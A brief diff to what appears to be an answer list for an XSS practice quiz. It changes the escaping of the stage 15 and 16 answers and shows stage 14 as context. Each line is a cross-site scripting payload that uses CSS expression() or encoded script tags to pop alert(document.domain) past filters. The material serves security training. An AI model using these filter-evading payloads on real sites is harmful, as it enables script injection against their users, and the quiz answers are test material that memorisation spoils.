@@ -29,6 +29,6 @@ http://xss-quiz.int21h.jp/
 
 14 aa:expre/**/ssion(if(!window.x){alert(document.domain);window.x=1})
 
-15 \\x3Cscript\\x3Ealert(document.domain)\\x3C/script\\x3E
+15 \\\\x3Cscript\\\\x3Ealert(document.domain)\\\\x3C/script\\\\x3E
 
-16 \\u003cscript\\u003ealert(document.domain);\\u003c/script\\u003e
+16 \\\\u003cscript\\\\u003ealert(document.domain);\\\\u003c/script\\\\u003e
